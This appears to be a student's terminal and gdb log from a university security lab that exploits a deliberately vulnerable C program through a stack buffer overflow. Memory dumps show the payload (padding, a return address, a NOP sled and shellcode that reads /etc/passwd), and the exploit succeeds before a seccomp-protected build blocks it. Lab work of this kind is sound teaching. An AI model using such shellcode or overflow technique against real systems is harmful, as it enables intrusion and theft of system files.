_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
cslocal:x:1000:1000:cslocal,,,:/home/cslocal:/bin/bash
ntp:x:111:117::/home/ntp:/bin/false
colord:x:112:120:colord colour management daemon,,,:/var/lib/colord:/bin/false
statd:x:113:65534::/var/lib/nfs:/bin/false
smmta:x:114:121:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:115:122:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
puppet:x:116:123:Puppet configuration management daemon,,,:/var/lib/puppet:/bin/false
[Inferior 1 (process 20254) exited normally]
(gdb) disas main
Dump of assembler code for function main:
   0x000000000040076e <+0>:	sub    $0x18,%rsp
   0x0000000000400772 <+4>:	mov    %edi,0xc(%rsp)
   0x0000000000400776 <+8>:	mov    %rsi,(%rsp)
   0x000000000040077a <+12>:	mov    $0x0,%eax
   0x000000000040077f <+17>:	callq  0x400711 <read_input>
   0x0000000000400784 <+22>:	mov    $0x0,%eax
   0x0000000000400789 <+27>:	add    $0x18,%rsp
   0x000000000040078d <+31>:	retq   
End of assembler dump.
(gdb) disas read_input 
Dump of assembler code for function read_input:
   0x0000000000400711 <+0>:	sub    $0x208,%rsp
   0x0000000000400718 <+7>:	mov    $0x40083b,%edi
   0x000000000040071d <+12>:	callq  0x400530 <puts@plt>
   0x0000000000400722 <+17>:	mov    0x200937(%rip),%rdx        # 0x601060 <stdin@@GLIBC_2.2.5>
   0x0000000000400729 <+24>:	mov    %rsp,%rax
   0x000000000040072c <+27>:	mov    %rdx,%rcx
   0x000000000040072f <+30>:	mov    $0x200,%edx
   0x0000000000400734 <+35>:	mov    $0x1,%esi
   0x0000000000400739 <+40>:	mov    %rax,%rdi
   0x000000000040073c <+43>:	callq  0x400540 <fread@plt>
   0x0000000000400741 <+48>:	mov    %rsp,%rax
   0x0000000000400744 <+51>:	mov    %rax,%rdi
   0x0000000000400747 <+54>:	callq  0x40069e <complex_verify>
   0x000000000040074c <+59>:	test   %eax,%eax
   0x000000000040074e <+61>:	js     0x40075c <read_input+75>
   0x0000000000400750 <+63>:	mov    $0x400856,%edi
   0x0000000000400755 <+68>:	callq  0x400530 <puts@plt>
   0x000000000040075a <+73>:	jmp    0x400766 <read_input+85>
   0x000000000040075c <+75>:	mov    $0x0,%eax
   0x0000000000400761 <+80>:	callq  0x400686 <party>
   0x0000000000400766 <+85>:	add    $0x208,%rsp
   0x000000000040076d <+92>:	retq   
End of assembler dump.
(gdb) b *0x0000000000400741
Breakpoint 1 at 0x400741
(gdb) b *0x0000000000400766
Breakpoint 2 at 0x400766
(gdb) r < payload
Starting program: /home/ryadav3/576/labs/lab9/vul/vuln_prog < payload
Enter verification string?

Breakpoint 1, 0x0000000000400741 in read_input ()
(gdb) x/100x $rsp
0x7fffffffe110:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe120:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe130:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe140:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe150:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe160:	0x41414141	0x41414141	0xffffe1aa	0x00007fff
0x7fffffffe170:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe180:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe190:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1a0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1b0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1c0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1d0:	0x90909090	0x793d8d48	0x48011111	0x1116ef81
0x7fffffffe1e0:	0x31480111	0x4802b0c0	0x3148f631	0x48050fd2
0x7fffffffe1f0:	0x3148c389	0x4805b0c0	0x1191c6c7	0x81480111
0x7fffffffe200:	0x111101ee	0xdf894801	0x48f42948	0x050fe689
0x7fffffffe210:	0x24548b48	0xd4294830	0x48df8948	0x3148e689
0x7fffffffe220:	0x48050fc0	0xff48c031	0xff3148c0	0x48c7ff48
0x7fffffffe230:	0x050fe689	0x04c03148	0xff31483c	0x652f050f
0x7fffffffe240:	0x702f6374	0x77737361	0xf7000064	0x00007fff
0x7fffffffe250:	0xffffe3e0	0x00007fff	0xf7dee923	0x00007fff
0x7fffffffe260:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe270:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe280:	0x2f2f2f2f	0x2f2f2f2f	0x2f2f2f2f	0x2f2f2f2f
0x7fffffffe290:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) bt
#0  0x0000000000400741 in read_input ()
#1  0x0000000000400784 in main ()
(gdb) i r rbp
rbp            0x400790	0x400790 <__libc_csu_init>
(gdb) i r rsp
rsp            0x7fffffffe110	0x7fffffffe110
(gdb) c
Continuing.
Verifying: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?????
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
cslocal:x:1000:1000:cslocal,,,:/home/cslocal:/bin/bash
ntp:x:111:117::/home/ntp:/bin/false
colord:x:112:120:colord colour management daemon,,,:/var/lib/colord:/bin/false
statd:x:113:65534::/var/lib/nfs:/bin/false
smmta:x:114:121:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:115:122:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
puppet:x:116:123:Puppet configuration management daemon,,,:/var/lib/puppet:/bin/false
[Inferior 1 (process 20264) exited normally]
(gdb) r < payload
Starting program: /home/ryadav3/576/labs/lab9/vul/vuln_prog < payload
Enter verification string?

Breakpoint 1, 0x0000000000400741 in read_input ()
(gdb) i r rsp
rsp            0x7fffffffe110	0x7fffffffe110
(gdb) quit
A debugging session is active.

	Inferior 1 [process 20277] will be killed.

Quit anyway? (y or n) y
ryadav3@nemo:~/576/labs/lab9/vul$ vim Makefile 
ryadav3@nemo:~/576/labs/lab9/vul$ make
make: Nothing to be done for 'all'.
ryadav3@nemo:~/576/labs/lab9/vul$ make clean
rm -rf vuln_prog sec_prog
ryadav3@nemo:~/576/labs/lab9/vul$ make
gcc -fno-stack-protector -z execstack -O0  -o vuln_prog vuln_prog1.c
gcc -fno-stack-protector -z execstack -O0  -o sec_prog sec_prog1.c -lseccomp
ryadav3@nemo:~/576/labs/lab9/vul$ setarch x86_64 -R ./vuln_prog < payload
Enter verification string?
Verifying: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?????
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
cslocal:x:1000:1000:cslocal,,,:/home/cslocal:/bin/bash
ntp:x:111:117::/home/ntp:/bin/false
colord:x:112:120:colord colour management daemon,,,:/var/lib/colord:/bin/false
statd:x:113:65534::/var/lib/nfs:/bin/false
smmta:x:114:121:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:115:122:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
puppet:x:116:123:Puppet configuration management daemon,,,:/var/lib/puppet:/bin/false
ryadav3@nemo:~/576/labs/lab9/vul$ setarch x86_64 -R ./sec_prog < payload
Bad system call
ryadav3@nemo:~/576/labs/lab9/vul$ gdb ./vuln_prog 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./vuln_prog...(no debugging symbols found)...done.
(gdb) disas read_input 
Dump of assembler code for function read_input:
   0x0000000000400708 <+0>:	push   %rbp
   0x0000000000400709 <+1>:	mov    %rsp,%rbp
   0x000000000040070c <+4>:	sub    $0x200,%rsp
   0x0000000000400713 <+11>:	mov    $0x40083b,%edi
   0x0000000000400718 <+16>:	callq  0x400530 <puts@plt>
   0x000000000040071d <+21>:	mov    0x20093c(%rip),%rdx        # 0x601060 <stdin@@GLIBC_2.2.5>
   0x0000000000400724 <+28>:	lea    -0x200(%rbp),%rax
   0x000000000040072b <+35>:	mov    %rdx,%rcx
   0x000000000040072e <+38>:	mov    $0x200,%edx
   0x0000000000400733 <+43>:	mov    $0x1,%esi
   0x0000000000400738 <+48>:	mov    %rax,%rdi
   0x000000000040073b <+51>:	callq  0x400540 <fread@plt>
   0x0000000000400740 <+56>:	lea    -0x200(%rbp),%rax
   0x0000000000400747 <+63>:	mov    %rax,%rdi
   0x000000000040074a <+66>:	callq  0x40069e <complex_verify>
   0x000000000040074f <+71>:	test   %eax,%eax
   0x0000000000400751 <+73>:	js     0x40075f <read_input+87>
   0x0000000000400753 <+75>:	mov    $0x400856,%edi
   0x0000000000400758 <+80>:	callq  0x400530 <puts@plt>
   0x000000000040075d <+85>:	jmp    0x400769 <read_input+97>
   0x000000000040075f <+87>:	mov    $0x0,%eax
   0x0000000000400764 <+92>:	callq  0x400686 <party>
   0x0000000000400769 <+97>:	leaveq 
   0x000000000040076a <+98>:	retq   
End of assembler dump.
(gdb) b *0x0000000000400740
Breakpoint 1 at 0x400740
(gdb) b *0x0000000000400769
Breakpoint 2 at 0x400769
(gdb) r < payload
Starting program: /home/ryadav3/576/labs/lab9/vul/vuln_prog < payload
Enter verification string?

Breakpoint 1, 0x0000000000400740 in read_input ()
(gdb) i r rbp
rbp            0x7fffffffe310	0x7fffffffe310
(gdb) x/100x $rsp
0x7fffffffe110:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe120:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe130:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe140:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe150:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe160:	0x41414141	0x41414141	0xffffe1aa	0x00007fff
0x7fffffffe170:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe180:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe190:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1a0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1b0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1c0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1d0:	0x90909090	0x793d8d48	0x48011111	0x1116ef81
0x7fffffffe1e0:	0x31480111	0x4802b0c0	0x3148f631	0x48050fd2
0x7fffffffe1f0:	0x3148c389	0x4805b0c0	0x1191c6c7	0x81480111
0x7fffffffe200:	0x111101ee	0xdf894801	0x48f42948	0x050fe689
0x7fffffffe210:	0x24548b48	0xd4294830	0x48df8948	0x3148e689
0x7fffffffe220:	0x48050fc0	0xff48c031	0xff3148c0	0x48c7ff48
0x7fffffffe230:	0x050fe689	0x04c03148	0xff31483c	0x652f050f
0x7fffffffe240:	0x702f6374	0x77737361	0xf7000064	0x00007fff
0x7fffffffe250:	0xffffe3e0	0x00007fff	0xf7dee923	0x00007fff
0x7fffffffe260:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe270:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe280:	0x2f2f2f2f	0x2f2f2f2f	0x2f2f2f2f	0x2f2f2f2f
0x7fffffffe290:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x/120x $rsp
0x7fffffffe110:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe120:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe130:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe140:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe150:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe160:	0x41414141	0x41414141	0xffffe1aa	0x00007fff
0x7fffffffe170:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe180:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe190:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1a0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1b0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1c0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1d0:	0x90909090	0x793d8d48	0x48011111	0x1116ef81
0x7fffffffe1e0:	0x31480111	0x4802b0c0	0x3148f631	0x48050fd2
0x7fffffffe1f0:	0x3148c389	0x4805b0c0	0x1191c6c7	0x81480111
0x7fffffffe200:	0x111101ee	0xdf894801	0x48f42948	0x050fe689
0x7fffffffe210:	0x24548b48	0xd4294830	0x48df8948	0x3148e689
0x7fffffffe220:	0x48050fc0	0xff48c031	0xff3148c0	0x48c7ff48
0x7fffffffe230:	0x050fe689	0x04c03148	0xff31483c	0x652f050f
0x7fffffffe240:	0x702f6374	0x77737361	0xf7000064	0x00007fff
0x7fffffffe250:	0xffffe3e0	0x00007fff	0xf7dee923	0x00007fff
0x7fffffffe260:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe270:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe280:	0x2f2f2f2f	0x2f2f2f2f	0x2f2f2f2f	0x2f2f2f2f
0x7fffffffe290:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe2a0:	0x00000000	0x00000000	0x00000000	0x0000ff00
0x7fffffffe2b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe2c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe2d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe2e0:	0x0000ff00	0x00ff0000	0xff000000	0xff000000
(gdb) x/128x $rsp
0x7fffffffe110:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe120:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe130:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe140:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe150:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe160:	0x41414141	0x41414141	0xffffe1aa	0x00007fff
0x7fffffffe170:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe180:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe190:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1a0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1b0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1c0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1d0:	0x90909090	0x793d8d48	0x48011111	0x1116ef81
0x7fffffffe1e0:	0x31480111	0x4802b0c0	0x3148f631	0x48050fd2
0x7fffffffe1f0:	0x3148c389	0x4805b0c0	0x1191c6c7	0x81480111
0x7fffffffe200:	0x111101ee	0xdf894801	0x48f42948	0x050fe689
0x7fffffffe210:	0x24548b48	0xd4294830	0x48df8948	0x3148e689
0x7fffffffe220:	0x48050fc0	0xff48c031	0xff3148c0	0x48c7ff48
0x7fffffffe230:	0x050fe689	0x04c03148	0xff31483c	0x652f050f
0x7fffffffe240:	0x702f6374	0x77737361	0xf7000064	0x00007fff
0x7fffffffe250:	0xffffe3e0	0x00007fff	0xf7dee923	0x00007fff
0x7fffffffe260:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe270:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe280:	0x2f2f2f2f	0x2f2f2f2f	0x2f2f2f2f	0x2f2f2f2f
0x7fffffffe290:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe2a0:	0x00000000	0x00000000	0x00000000	0x0000ff00
0x7fffffffe2b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe2c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe2d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe2e0:	0x0000ff00	0x00ff0000	0xff000000	0xff000000
0x7fffffffe2f0:	0x00000001	0x00000000	0x004007dd	0x00000000
0x7fffffffe300:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x/136x $rsp
0x7fffffffe110:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe120:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe130:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe140:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe150:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe160:	0x41414141	0x41414141	0xffffe1aa	0x00007fff
0x7fffffffe170:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe180:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe190:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1a0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1b0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1c0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1d0:	0x90909090	0x793d8d48	0x48011111	0x1116ef81
0x7fffffffe1e0:	0x31480111	0x4802b0c0	0x3148f631	0x48050fd2
0x7fffffffe1f0:	0x3148c389	0x4805b0c0	0x1191c6c7	0x81480111
0x7fffffffe200:	0x111101ee	0xdf894801	0x48f42948	0x050fe689
0x7fffffffe210:	0x24548b48	0xd4294830	0x48df8948	0x3148e689
0x7fffffffe220:	0x48050fc0	0xff48c031	0xff3148c0	0x48c7ff48
0x7fffffffe230:	0x050fe689	0x04c03148	0xff31483c	0x652f050f
0x7fffffffe240:	0x702f6374	0x77737361	0xf7000064	0x00007fff
0x7fffffffe250:	0xffffe3e0	0x00007fff	0xf7dee923	0x00007fff
0x7fffffffe260:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe270:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe280:	0x2f2f2f2f	0x2f2f2f2f	0x2f2f2f2f	0x2f2f2f2f
0x7fffffffe290:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe2a0:	0x00000000	0x00000000	0x00000000	0x0000ff00
0x7fffffffe2b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe2c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe2d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe2e0:	0x0000ff00	0x00ff0000	0xff000000	0xff000000
0x7fffffffe2f0:	0x00000001	0x00000000	0x004007dd	0x00000000
0x7fffffffe300:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe310:	0xffffe330	0x00007fff	0x00400784	0x00000000
0x7fffffffe320:	0xffffe418	0x00007fff	0x00000000	0x00000001
(gdb) bt
#0  0x0000000000400740 in read_input ()
#1  0x0000000000400784 in main ()
(gdb) disas
Dump of assembler code for function read_input:
   0x0000000000400708 <+0>:	push   %rbp
   0x0000000000400709 <+1>:	mov    %rsp,%rbp
   0x000000000040070c <+4>:	sub    $0x200,%rsp
   0x0000000000400713 <+11>:	mov    $0x40083b,%edi
   0x0000000000400718 <+16>:	callq  0x400530 <puts@plt>
   0x000000000040071d <+21>:	mov    0x20093c(%rip),%rdx        # 0x601060 <stdin@@GLIBC_2.2.5>
   0x0000000000400724 <+28>:	lea    -0x200(%rbp),%rax
   0x000000000040072b <+35>:	mov    %rdx,%rcx
   0x000000000040072e <+38>:	mov    $0x200,%edx
   0x0000000000400733 <+43>:	mov    $0x1,%esi
   0x0000000000400738 <+48>:	mov    %rax,%rdi
   0x000000000040073b <+51>:	callq  0x400540 <fread@plt>
=> 0x0000000000400740 <+56>:	lea    -0x200(%rbp),%rax
   0x0000000000400747 <+63>:	mov    %rax,%rdi
   0x000000000040074a <+66>:	callq  0x40069e <complex_verify>
   0x000000000040074f <+71>:	test   %eax,%eax
   0x0000000000400751 <+73>:	js     0x40075f <read_input+87>
   0x0000000000400753 <+75>:	mov    $0x400856,%edi
   0x0000000000400758 <+80>:	callq  0x400530 <puts@plt>
   0x000000000040075d <+85>:	jmp    0x400769 <read_input+97>
   0x000000000040075f <+87>:	mov    $0x0,%eax
   0x0000000000400764 <+92>:	callq  0x400686 <party>
   0x0000000000400769 <+97>:	leaveq 
   0x000000000040076a <+98>:	retq   
End of assembler dump.
(gdb) disas complex_verify 
Dump of assembler code for function complex_verify:
   0x000000000040069e <+0>:	push   %rbp
   0x000000000040069f <+1>:	mov    %rsp,%rbp
   0x00000000004006a2 <+4>:	sub    $0x60,%rsp
   0x00000000004006a6 <+8>:	mov    %rdi,-0x58(%rbp)
   0x00000000004006aa <+12>:	mov    -0x58(%rbp),%rax
   0x00000000004006ae <+16>:	mov    %rax,%rsi
   0x00000000004006b1 <+19>:	mov    $0x40082c,%edi
   0x00000000004006b6 <+24>:	mov    $0x0,%eax
   0x00000000004006bb <+29>:	callq  0x400550 <printf@plt>
   0x00000000004006c0 <+34>:	mov    -0x58(%rbp),%rdx
   0x00000000004006c4 <+38>:	lea    -0x50(%rbp),%rax
   0x00000000004006c8 <+42>:	mov    %rdx,%rsi
   0x00000000004006cb <+45>:	mov    %rax,%rdi
   0x00000000004006ce <+48>:	callq  0x400520 <strcpy@plt>
   0x00000000004006d3 <+53>:	movl   $0x0,-0x4(%rbp)
   0x00000000004006da <+60>:	jmp    0x4006f8 <complex_verify+90>
   0x00000000004006dc <+62>:	mov    -0x4(%rbp),%eax
   0x00000000004006df <+65>:	cltq   
   0x00000000004006e1 <+67>:	movzbl -0x50(%rbp,%rax,1),%eax
   0x00000000004006e6 <+72>:	add    $0x1,%eax
   0x00000000004006e9 <+75>:	mov    %eax,%edx
   0x00000000004006eb <+77>:	mov    -0x4(%rbp),%eax
   0x00000000004006ee <+80>:	cltq   
   0x00000000004006f0 <+82>:	mov    %dl,-0x50(%rbp,%rax,1)
   0x00000000004006f4 <+86>:	addl   $0x1,-0x4(%rbp)
   0x00000000004006f8 <+90>:	mov    -0x4(%rbp),%eax
   0x00000000004006fb <+93>:	cmp    $0x3e,%eax
   0x00000000004006fe <+96>:	jbe    0x4006dc <complex_verify+62>
   0x0000000000400700 <+98>:	mov    -0x4(%rbp),%eax
   0x0000000000400703 <+101>:	sub    $0x3e,%eax
   0x0000000000400706 <+104>:	leaveq 
   0x0000000000400707 <+105>:	retq   
End of assembler dump.
(gdb) b *0x00000000004006d3
Breakpoint 3 at 0x4006d3
(gdb) c
Continuing.
Verifying: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?????

Breakpoint 3, 0x00000000004006d3 in complex_verify ()
(gdb) bt
#0  0x00000000004006d3 in complex_verify ()
#1  0x00007fffffffe1aa in ?? ()
#2  0x4141414141414141 in ?? ()
#3  0x4141414141414141 in ?? ()
#4  0x4141414141414141 in ?? ()
#5  0x4141414141414141 in ?? ()
#6  0x4141414141414141 in ?? ()
#7  0x4141414141414141 in ?? ()
#8  0x4141414141414141 in ?? ()
#9  0x4141414141414141 in ?? ()
#10 0x4141414141414141 in ?? ()
#11 0x4141414141414141 in ?? ()
#12 0x4141414141414141 in ?? ()
#13 0x00007fffffffe1aa in ?? ()
#14 0x9090909090909090 in ?? ()
#15 0x9090909090909090 in ?? ()
#16 0x9090909090909090 in ?? ()
#17 0x9090909090909090 in ?? ()
#18 0x9090909090909090 in ?? ()
#19 0x9090909090909090 in ?? ()
#20 0x9090909090909090 in ?? ()
#21 0x9090909090909090 in ?? ()
#22 0x9090909090909090 in ?? ()
#23 0x9090909090909090 in ?? ()
#24 0x9090909090909090 in ?? ()
#25 0x9090909090909090 in ?? ()
#26 0x793d8d4890909090 in ?? ()
#27 0x1116ef8148011111 in ?? ()
#28 0x4802b0c031480111 in ?? ()
#29 0x48050fd23148f631 in ?? ()
#30 0x4805b0c03148c389 in ?? ()
#31 0x814801111191c6c7 in ?? ()
#32 0xdf894801111101ee in ?? ()
#33 0x050fe68948f42948 in ?? ()
#34 0xd429483024548b48 in ?? ()
#35 0x3148e68948df8948 in ?? ()
#36 0xff48c03148050fc0 in ?? ()
#37 0x48c7ff48ff3148c0 in ?? ()
#38 0x04c03148050fe689 in ?? ()
#39 0x652f050fff31483c in ?? ()
#40 0x77737361702f6374 in ?? ()
#41 0x00007ffff7000064 in ?? ()
#42 0x00007fffffffe3e0 in ?? ()
#43 0x00007ffff7dee923 in _dl_runtime_resolve_avx () at ../sysdeps/x86_64/dl-trampoline.h:112
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
(gdb) i r rbp
rbp            0x7fffffffe100	0x7fffffffe100
(gdb) x/100x $rsp
0x7fffffffe0a0:	0x0000013b	0x00000000	0xffffe110	0x00007fff
0x7fffffffe0b0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe0c0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe0d0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe0e0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe0f0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe100:	0x41414141	0x41414141	0xffffe1aa	0x00007fff
0x7fffffffe110:	0x41414141	0x41414141	0x41414141	0x41414141
